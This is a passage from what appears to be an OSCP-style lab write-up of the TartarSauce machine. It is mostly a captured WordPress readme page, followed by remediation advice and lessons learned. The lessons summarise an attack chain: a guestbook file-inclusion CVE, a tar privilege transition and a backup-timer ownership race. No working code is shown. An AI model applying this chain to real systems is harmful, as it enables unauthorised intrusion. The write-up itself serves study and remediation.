	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>WordPress &#8250; ReadMe</title>
	<link rel="stylesheet" href="wp-admin/css/install.css?ver=20100228" type="text/css" />
</head>
<body>
<h1 id="logo">
	<a href="https://wordpress.org/"><img alt="WordPress" src="wp-admin/images/wordpress-logo.png" /></a>
</h1>
<p style="text-align: center">Semantic Personal Publishing Platform</p>

<h2>First Things First</h2>
<p>Welcome. WordPress is a very special project to me. Every developer and contributor adds something unique to the mix, and together we create something beautiful that I&#8217;m proud to be a part of. Thousands of hours have gone into WordPress, and we&#8217;re dedicated to making it better every day. Thank you for making it part of your world.</p>
<p style="text-align: right">&#8212; Matt Mullenweg</p>

<h2>Installation: Famous 5-minute install</h2>
<ol>
	<li>Unzip the package in an empty directory and upload everything.</li>
	<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser. It will take you through the process to set up a <code>wp-config.php</code> file with your database connection details.
		<ol>
			<li>If for some reason this doesn&#8217;t work, don&#8217;t worry. It doesn&#8217;t work on all web hosts. Open up <code>wp-config-sample.php</code> with a text editor like WordPad or similar and fill in your database connection details.</li>
			<li>Save the file as <code>wp-config.php</code> and upload it.</li>
			<li>Open <span class="file"><a href="wp-admin/install.php">wp-admin/install.php</a></span> in your browser.</li>
		</ol>
	</li>
	<li>Once the configuration file is set up, the installer will set up the tables needed for your blog. If there is an error, double check your <code>wp-config.php</code> file, and try again. If it fails again, please go to the <a href="https://wordpress.org/support/" title="WordPress support">support forums</a> with as much data as you can gather.</li>
	<li><strong>If you did not enter a password, note the password given to you.</strong> If you did not provide a username, it will be <code>admin</code>.</li>
	<li>The installer should then send you to the <a href="wp-login.php">login page</a>. Sign in with the username and password you chose during the installation. If a password was generated for you, you can then click on &#8220;Profile&#8221; to change the password.</li>
</ol>

<h2>Updating</h2>
<h3>Using the Automatic Updater</h3>
<p>If you are updating from version 2.7 or higher, you can use the automatic updater:</p>
<ol>
	<li>Open <span class="file"><a href="wp-admin/update-core.php">wp-admin/update-core.php</a></span> in your browser and follow the instructions.</li>
	<li>You wanted more, perhaps? That&#8217;s it!</li>
</ol>

<h3>Updating Manually</h3>
<ol>
	<li>Before you update anything, make sure you have backup copies of any files you may have modified such as <code>index.php</code>.</li>
	<li>Delete your old WordPress files, saving ones you&#8217;ve modified.</li>
	<li>Upload the new files.</li>
	<li>Point your browser to <span class="file"><a href="wp-admin/upgrade.php">/wp-admin/upgrade.php</a>.</span></li>
</ol>

<h2>Migrating from other systems</h2>
<p>WordPress can <a href="https://codex.wordpress.org/Importing_Content">import from a number of systems</a>. First you need to get WordPress installed and working as described above, before using <a href="wp-admin/import.php" title="Import to WordPress">our import tools</a>.</p>

<h2>System Requirements</h2>
<ul>
	<li><a href="https://secure.php.net/">PHP</a> version <strong>5.2.4</strong> or higher.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>5.0</strong> or higher.</li>
</ul>

<h3>Recommendations</h3>
<ul>
	<li><a href="https://secure.php.net/">PHP</a> version <strong>7</strong> or higher.</li>
	<li><a href="https://www.mysql.com/">MySQL</a> version <strong>5.6</strong> or higher.</li>
	<li>The <a href="https://httpd.apache.org/docs/2.2/mod/mod_rewrite.html">mod_rewrite</a> Apache module.</li>
	<li><a href="https://wordpress.org/news/2016/12/moving-toward-ssl/">HTTPS</a> support.</li>
	<li>A link to <a href="https://wordpress.org/">wordpress.org</a> on your site.</li>
</ul>

<h2>Online Resources</h2>
<p>If you have any questions that aren&#8217;t addressed in this document, please take advantage of WordPress&#8217; numerous online resources:</p>
<dl>
	<dt><a href="https://codex.wordpress.org/">The WordPress Codex</a></dt>
		<dd>The Codex is the encyclopedia of all things WordPress. It is the most comprehensive source of information for WordPress available.</dd>
	<dt><a href="https://wordpress.org/news/">The WordPress Blog</a></dt>
		<dd>This is where you&#8217;ll find the latest updates and news related to WordPress. Recent WordPress news appears in your administrative dashboard by default.</dd>
	<dt><a href="https://planet.wordpress.org/">WordPress Planet</a></dt>
		<dd>The WordPress Planet is a news aggregator that brings together posts from WordPress blogs around the web.</dd>
	<dt><a href="https://wordpress.org/support/">WordPress Support Forums</a></dt>
		<dd>If you&#8217;ve looked everywhere and still can&#8217;t find an answer, the support forums are very active and have a large community ready to help. To help them help you be sure to use a descriptive thread title and describe your question in as much detail as possible.</dd>
	<dt><a href="https://codex.wordpress.org/IRC">WordPress <abbr title="Internet Relay Chat">IRC</abbr> Channel</a></dt>
		<dd>There is an online chat channel that is used for discussion among people who use WordPress and occasionally support topics. The above wiki page should point you in the right direction. (<a href="irc://irc.freenode.net/wordpress">irc.freenode.net #wordpress</a>)</dd>
</dl>

<h2>Final Notes</h2>
<ul>
	<li>If you have any suggestions, ideas, or comments, or if you (gasp!) found a bug, join us in the <a href="https://wordpress.org/support/">Support Forums</a>.</li>
	<li>WordPress has a robust plugin <abbr title="application programming interface">API</abbr> that makes extending the code easy. If you are a developer interested in utilizing this, see the <a href="https://developer.wordpress.org/plugins/">Plugin Developer Handbook</a>. You shouldn&#8217;t modify any of the core code.</li>
</ul>

<h2>Share the Love</h2>
<p>WordPress has no multi-million dollar marketing campaign or celebrity sponsors, but we do have something even better&#8212;you. If you enjoy WordPress please consider telling a friend, setting it up for someone less knowledgable than yourself, or writing the author of a media article that overlooks us.</p>

<p>WordPress is the official continuation of <a href="http://cafelog.com/">b2/caf&#233;log</a>, which came from Michel V. The work has been continued by the <a href="https://wordpress.org/about/">WordPress developers</a>. If you would like to support WordPress, please consider <a href="https://wordpress.org/donate/" title="Donate to WordPress">donating</a>.</p>

<h2>License</h2>
<p>WordPress is free software, and is released under the terms of the <abbr title="GNU General Public License">GPL</abbr> version 2 or (at your option) any later version. See <a href="license.txt">license.txt</a>.</p>

</body>
</html>
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on TartarSauce | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

The decisive skill on TartarSauce was prioritisation. The first application branch had a plausible public exploit, but the target rejected the upload. WordPress enumeration then exposed a more direct route. After foothold, the box rewarded reading the exact privilege boundary: `tar` was a direct user transition, while the backup timer was an archive ownership race. Finally, the architecture check prevented a misleading “successful” root extraction from becoming an execution failure.

## External resources

- [GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/)
- [HackTricks WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [CVE-2015-8351 / Gwolle Guestbook](https://nvd.nist.gov/vuln/detail/CVE-2015-8351)
- [HackTricks file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

TartarSauce rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
